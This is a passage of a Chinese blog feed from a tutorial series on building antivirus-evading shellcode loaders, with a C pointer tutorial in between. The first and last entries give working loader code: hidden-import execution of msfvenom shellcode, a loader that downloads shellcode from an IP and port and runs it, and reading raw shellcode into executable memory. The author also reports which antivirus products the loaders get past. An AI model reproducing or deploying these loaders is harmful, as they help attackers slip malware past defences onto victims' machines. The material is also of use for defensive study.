class="string">&quot;\xfc\xe8\x82\x0\x0\x0\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\xc\x8b\x52\x14\x8b\x72\x28\xf\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x2\x2c\x20\xc1\xcf\xd\x1\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x1\xd1\x51\x8b\x59\x20\x1\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x1\xd6\x31\xff\xac\xc1\xcf\xd\x1\xc7\x38\xe0\x75\xf6\x3\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x1\xd3\x66\x8b\xc\x4b\x8b\x58\x1c\x1\xd3\x8b\x4\x8b\x1\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x1\x8d\x85\xb2\x0\x0\x0\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x6\x7c\xa\x80\xfb\xe0\x75\x5\xbb\x47\x13\x72\x6f\x6a\x0\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x0\x0&quot;</span>;</span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shellcode = (<span class="type">char</span>*)MyVirtualAlloc(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//基址</span></span><br><span class="line">shellcode_size,  <span class="comment">//大小</span></span><br><span class="line">MEM_COMMIT, <span class="comment">//内存页状态</span></span><br><span class="line">PAGE_READWRITE <span class="comment">//可读可写可执行</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//CopyMemory(shellcode, buf, shellcode_size);</span></span><br><span class="line"><span class="built_in">memcpy</span>(shellcode, buf, shellcode_size);</span><br><span class="line">MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line">hThread = MyCreateThread(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">);</span><br><span class="line">MyWaitForSingleObject(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用peview查看一下新生成的程序</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328083854215.png" alt="image-20220328083854215"></p><p>导入表中已经没有<code>Virtual Alloc</code>、<code>CreateThread</code>这些函数了</p><p>将隐藏导入表代码和分离免杀的代码合并。检验一下效果。火绒，360静动全过，defender静态过了，动态被杀。暂时不上传virustotal检测了，之前检测率7/65的木马，今天再上传已经是23/65了，看来杀软也在分析标记virustotal上的样本。除了颠覆性的技术出现让所有杀软都检测不出来，免杀大多数时候过主流杀软就可以了。</p><p>通过命令行参数将shellcode地址传给程序，避免暴露ip等信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>* data;</span><br><span class="line"><span class="type">char</span> *ip = argv[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> port = stoi(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="type">char</span> *filename = argv[<span class="number">3</span>];</span><br><span class="line">data = WinGet(ip, port, filename);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;返回的数据为: &quot;</span> &lt;&lt; data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; argc;</span><br><span class="line"><span class="type">char</span>* buf = StrToShellcode(data);</span><br><span class="line">load(buf, <span class="number">2048</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从0开始写ShellCode加载器0x3-C++/C指针详解</title>
      <link href="/CppAndC-Pointer.html"/>
      <url>/CppAndC-Pointer.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是从0开始写ShellCode加载器的第3篇文章，文章列表，样本demo已上传到<a href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p></blockquote><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>作为一名计算机专业的毕业生，C/C++是大学必学内容。但是学了之后除了写写数据结构和算法，其它地方基本没用过。用C++写shellcode加载器的过程中，遇到了很多问题，今天系统的来解决一下，也是为以后的工作打下基础。</p><p>开始之前先测试一下，如果以下代码每一行你都能理解，那么这篇文章你没必要看。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf;</span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line"><span class="type">char</span> buf[];</span><br><span class="line"><span class="type">char</span> *buf[];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,&amp;buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,*buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">load</span><span class="params">(<span class="type">char</span> str[])</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">load</span><span class="params">(<span class="type">char</span> str[])</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>觉得晕了的请继续往下看。</p><h3 id="指针与变量"><a href="#指针与变量" class="headerlink" title="指针与变量"></a>指针与变量</h3><p>要理解c语言的指针，就得先理解c语言变量的定义和存储。我们都很熟悉一个概念，即：<code>*</code>返回指针型变量所指变量的内容  <code>&amp;</code>返回指定变量存储空间的首地址。这个概念讲的是<code>*</code>和<code>&amp;</code>两个运算符的作用，我们先来看看&amp;，取地址符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;buf = %c , size of buf = %dbyte \n&quot;</span>,buf,<span class="keyword">sizeof</span>(buf)); </span><br><span class="line"><span class="comment">//buf = a , size of buf = 1byte </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&amp;buf = %p , size of &amp;buf = %dbyte \n&quot;</span>,&amp;buf,<span class="keyword">sizeof</span>(&amp;buf)); </span><br><span class="line"><span class="comment">//&amp;buf = 0061FF17 , size of &amp;buf = 4byte</span></span><br></pre></td></tr></table></figure><p>char类型变量buf，存储的内容是字符a，占空间大小为1字节。buf变量存储的地址为0061FF17，此地址占空间大小为32比特，4字节。</p><p>再来看看<code>*</code>，取内容运算符。首先第一个要注意的地方是指针类型变量的初始化，只能有两种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">指针变量初始化：将已存在的变量地址赋值 或 <span class="literal">NULL</span></span><br><span class="line"><span class="type">char</span> *buf = 这里一定是个地址 或 <span class="literal">NULL</span></span><br><span class="line"><span class="type">char</span> *buf = <span class="string">&#x27;a&#x27;</span> <span class="comment">//这种写法是错误的</span></span><br></pre></td></tr></table></figure><p>我们继续往下写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> *buf1 = &amp;buf; <span class="comment">//将buf变量的地址赋值</span></span><br><span class="line"><span class="comment">//buf1 = &amp;buf;   //如果上一步赋值为NULL，也可这样写</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;buf1 = %p ,*buf1 = %c, size of buf1 = %d \n&quot;</span>,buf1,*buf1,<span class="keyword">sizeof</span>(buf1)); </span><br><span class="line"><span class="comment">//buf1 = 0061FF17 ,*buf1 = a, size of buf1 = 4</span></span><br></pre></td></tr></table></figure><p>此时我们发现，变量buf和指针型变量buf1指向的内存地址是一样的，这也就是说，*buf1和buf是等价的（就好比土豆和马铃薯的关系），更改一个另一个也会改变。</p><h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><p>了解了一般变量和指针的联系，我们再来看看数组和指针的联系。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="built_in">list</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> *l = &amp;<span class="built_in">list</span>[<span class="number">0</span>]; <span class="comment">//将数组首元素的地址赋值</span></span><br><span class="line"><span class="type">int</span> *j = <span class="built_in">list</span>; <span class="comment">//将数组名赋值</span></span><br></pre></td></tr></table></figure><p>在数据结构中我们学习过，数组又叫线性表，在内存中是一段连续的地址空间。数组名就是数组存储空间的首地址，同时也是首元素的地址。所以以上代码中，指针l和j所指向的地址是完全一样的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220326210740519.png" alt="image-20220326210740519"></p><p>那么，既然数组名list、指针l、指针j，在内存中地址是相同的，他们的意义自然也是等价的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;j[1] = %d ,l[1] = %d ,list[1] = %d  \n&quot;</span>,j[<span class="number">1</span>],l[<span class="number">1</span>],<span class="built_in">list</span>[<span class="number">1</span>]); </span><br><span class="line"><span class="comment">//j[1] = 2 ,l[1] = 2 ,list[1] = 2</span></span><br></pre></td></tr></table></figure><p>指针对于数组访问还支持加减法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*j = %d \n&quot;</span>,*j);<span class="comment">//*j = 1 </span></span><br><span class="line">j = j+<span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*j = %d \n&quot;</span>,*j); <span class="comment">//*j = 2</span></span><br><span class="line">j--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*j = %d \n&quot;</span>,*j); <span class="comment">//*j = 1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*(j + 1) = %d \n&quot;</span>,*(j+<span class="number">1</span>)); <span class="comment">//*(j + 1) = 2</span></span><br><span class="line"></span><br><span class="line">l = &amp;<span class="built_in">list</span>[<span class="number">1</span>];</span><br><span class="line">j = &amp;<span class="built_in">list</span>[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;j = %p, l = %p  j-l = %d\n&quot;</span>,j,l,j-l);</span><br><span class="line"><span class="comment">//j = 0061FF0C, l = 0061FF00  j-l = 3</span></span><br><span class="line"><span class="comment">//注意：0061FF0C - 0061FF00 = 0000000C，也就是十进制的12，然而减法结果是3，此处的3其实代表3 × sizeof(int) = 12，即l与j之间相隔3个int型数据。</span></span><br></pre></td></tr></table></figure><blockquote><p>其实数组名也支持上述运算，只不过为了保持代码可读性，常常使用下标访问数组元素。</p></blockquote><hr><p>第一次学习指针时我就有一个疑问，既然指针能直接操作内存中的数据，那么能不能用本程序的指针去修改其它程序的数据呢？我写了一个小程序测验一下，看看这段程序会不会引起系统其它程序的崩溃。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="built_in">list</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> *j = <span class="built_in">list</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">   j++;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;j = %p, *j= %d\n&quot;</span>,j,*j);</span><br><span class="line">   *j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220326222956461.png" alt="image-20220326222956461"></p><p>可以看到程序自己崩溃了，并没有引起系统的崩溃。</p><h3 id="指针与函数"><a href="#指针与函数" class="headerlink" title="指针与函数"></a>指针与函数</h3><h4 id="指针型参数"><a href="#指针型参数" class="headerlink" title="指针型参数"></a>指针型参数</h4><p>C语言中函数采用值传递机制，在函数中对形参进行任何修改，都不会影响到实际参数，所以函数中无法访问和更新外部定义的变量。</p><p>指针型参数将外部变量的地址传递给函数，函数可以通过指针访问和更新外部变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">char</span> *a,<span class="type">char</span> *b)</span> <span class="comment">//a b为形参</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> temp;</span><br><span class="line">   temp = *a;</span><br><span class="line">   *a = *b;</span><br><span class="line">   *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">   <span class="type">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;a = %c, b = %c \n&quot;</span>,a,b); </span><br><span class="line">   <span class="comment">//a = a, b = b</span></span><br><span class="line">   swap(&amp;a,&amp;b); <span class="comment">//a b为实参</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;a = %c, b = %c \n&quot;</span>,a,b);</span><br><span class="line">   <span class="comment">//a = b, b = a </span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于数组型参数，也是一样的效果，因为我们已经知道了，数组名其实就是指向数组存储空间首地址的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> buf[])</span></span><br><span class="line"><span class="comment">//void change(int *buf) 这两种定义是一样的</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      buf[i] = <span class="number">0</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">int</span> buf[<span class="number">5</span>] =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,buf[i]);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="comment">//1 2 3 4 5</span></span><br><span class="line">   <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   change(buf);</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,buf[i]);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="comment">//0 0 0 0 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：对于<code>void change(int buf[])</code>的形式参数定义，不管有没有数组大小的描述，都不是一个数组名，而是一个指针变量，仅保存了数组首元素的地址，而没有保存整个数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> buf[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;change::size of buf = %d\n&quot;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">   <span class="comment">//change::size of buf = 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">int</span> buf[<span class="number">5</span>] =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;main::size of buf = %d\n&quot;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">   <span class="comment">//main::size of buf = 20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在<a href="https://luckyfuture.top/BypassAVLearning2.html">分离免杀</a>文章中，我有一个疑惑：data的size为什么是4字节，<code> char *data = new char[length];</code>创建对象，大小为什么不是length的长度？</p><p>现在这个问题解决了，data存储<code>new char[length]</code>返回的新创建的数组地址，而不是整个数组。</p></blockquote><h4 id="指针型返回值"><a href="#指针型返回值" class="headerlink" title="指针型返回值"></a>指针型返回值</h4><p>函数的返回值类型也可以定义为指针，也就是说函数可以把计算结果放在某个存储单元内，把其存储地址作为返回值送回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *<span class="title function_">newlist</span><span class="params">(<span class="type">int</span> *<span class="built_in">list</span>,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> *newL = new <span class="type">int</span>(size);</span><br><span class="line">   <span class="comment">//int newL[5]; //以上两种初始化方式都可</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">//int newL[size]; //错误用法</span></span><br><span class="line">   <span class="comment">//int *newL; //错误  注意，指针变量在初始化时一定要赋值地址或NULL，否则指向的是一个无效地址，关于动态内存分配我会在写一篇文章详细探讨</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      newL[i]=<span class="built_in">list</span>[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> newL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">int</span> buf[<span class="number">5</span>] =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">   <span class="type">int</span> *newL = newlist(buf,<span class="number">5</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;newL: &quot;</span>);</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,newL[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//newL: 1 2 3 4 5</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;address of buf = %p, address of newL = %p \n&quot;</span>,buf,newL); </span><br><span class="line">   <span class="comment">//address of buf = 0061FEE8, address of newL = 00EC7EF0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>学习了这些，函数传参再也不会晕了。</p></blockquote><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>指针型变量，指向内存中的地址，其值是一个地址</p><p>数组名也是指针型变量，指向数组存储空间首地址，可用操作指针的方式操作数组名</p><p>指针型参数，接收一个地址作为参数</p><p>指针型返回值，返回一个地址</p><p>指针型变量初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char *buf = 这里一定是个地址 或 NULL</span><br></pre></td></tr></table></figure><p>经过本次学习，对于指针有了更清晰的认识，使用起来也更加得心应手。</p>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从0开始写ShellCode加载器0x2-分离免杀</title>
      <link href="/BypassAVLearning2.html"/>
      <url>/BypassAVLearning2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是从0开始写ShellCode加载器的第2篇文章，文章列表，样本demo已上传到<a href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p></blockquote><p>之前的免杀都是把shellcode直接放在程序里面执行，分离免杀是将恶意代码放置在程序本身之外的一种加载方式。</p><h3 id="从文件中加载shellcode"><a href="#从文件中加载shellcode" class="headerlink" title="从文件中加载shellcode"></a>从文件中加载shellcode</h3><p>首先是最基本的，从raw格式的文件中读取shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec cmd=calc.exe -f raw -o calc</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220324183454110.png" alt="image-20220324183454110"></p><p>shellcode虽然平常使用16进制形式的居多，但它本质上还是一段二进制的字节流，要用二进制的方法来读取。使用C++中ifstream类相关方法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> shellcode_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* shellcode = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line">    <span class="comment">//CreateThread函数，创建线程</span></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 若成功，接收新创建的线程的线程ID DWORD变量的地址。</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//通过调用 WaitForSingleObject 函数来监视事件状态,当事件设置为终止状态（WaitForSingleObject 返回 WAIT_OBJECT_0）时，每个线程都将自行终止执行。</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span 